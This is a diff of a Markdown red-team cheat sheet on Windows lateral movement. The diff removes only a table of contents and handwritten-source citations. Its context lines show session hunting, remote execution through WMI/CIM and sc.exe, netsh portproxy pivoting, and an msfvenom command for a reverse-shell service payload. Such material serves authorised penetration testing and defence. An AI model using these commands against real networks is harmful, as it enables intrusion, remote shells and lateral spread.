@@ -5,17 +5,6 @@
 
 ---
 
-## Table of Contents
-
-- [Lateral Movement Technique Matrix](#lateral-movement-technique-matrix)
-- [Session Hunting & Admin Target Discovery](#session-hunting--admin-target-discovery)
-- [WinRM & PSRemoting Lateral Movement](#winrm--psremoting-lateral-movement)
-- [WMI & Service Manager Remote Execution](#wmi--service-manager-remote-execution)
-- [PsExec & Remote Service Creation](#psexec--remote-service-creation)
-- [Network Pivoting & Windows Netsh Portproxy](#network-pivoting--windows-netsh-portproxy)
-
----
-
 ## Lateral Movement Technique Matrix
 
 | Method | Protocol / Ports | Requirements | OPSEC / Noise Level |
@@ -42,7 +31,6 @@ Invoke-SessionHunter -NoPortScan -RawResults
 # Locate machines where specific Domain Admin users are logged on
 Find-DomainUserLocation
 ```
-> **Source:** handwritten pp. 21, 25.
 
 ---
 
@@ -77,8 +65,6 @@ C:\> set username
 C:\> set computername
 ```
 
-> **Source:** handwritten pp. 16, 20–21.
-
 ---
 
 ## WMI & Service Manager Remote Execution
@@ -92,7 +78,6 @@ Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c pow
 # WMI command execution via PowerShell CIM cmdlet
 Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc.exe'} -ComputerName <TARGET_HOST>
 ```
-> **Source:** handwritten pp. 32–36.
 
 ---
 
@@ -108,8 +93,6 @@ sc.exe \\<TARGET_HOST> start <SERVICE_NAME>
 
 > [!WARNING]
 > **Payload Requirement:** Binaries executed by `sc.exe` must communicate with the Windows Service Control Manager (e.g. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service`). Standard executables will time out and fail.
-
-> **Source:** handwritten pp. 34–36.
 
 ---
 
@@ -139,5 +122,3 @@ netsh interface portproxy show all
 # Reset / Delete portproxy rule after operation
 netsh interface portproxy reset
 ```
-
-> **Source:** handwritten pp. 26, 28.
